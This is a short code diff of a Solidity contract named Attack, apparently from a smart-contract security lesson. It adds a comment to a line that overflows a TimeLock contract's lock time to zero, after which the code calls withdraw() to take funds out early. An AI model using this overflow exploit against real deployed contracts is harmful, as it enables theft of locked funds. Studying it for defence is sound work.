@@ -60,7 +60,7 @@ contract Attack {
         so x = type(uint).max + 1 - t
         */
         timeLock.increaseLockTime(
-            type(uint256).max + 1 - timeLock.lockTime(address(this))
+            type(uint256).max + 1 - timeLock.lockTime(address(this))//this will oveflow locktime to 0
         );
         timeLock.withdraw();
     }
